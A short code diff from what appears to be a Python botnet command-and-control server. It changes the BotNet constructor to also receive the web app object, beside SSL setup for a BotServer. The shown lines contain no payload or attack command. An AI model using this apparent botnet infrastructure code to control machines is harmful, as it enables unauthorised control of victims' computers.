@@ -424,7 +424,7 @@ def main():
             print("[!] There is a known bug with SSL and eventlet/Python 3.6,\n" +
                   "\ttry a different python version or turn off SSL")
 
-    botnet = BotNet(socketio)
+    botnet = BotNet(socketio, app)
     if USE_SSL_BOTS:
         botserver = BotServer(botnet, socketio, certfile=CERT_FILE, keyfile=KEY_FILE)
     else:
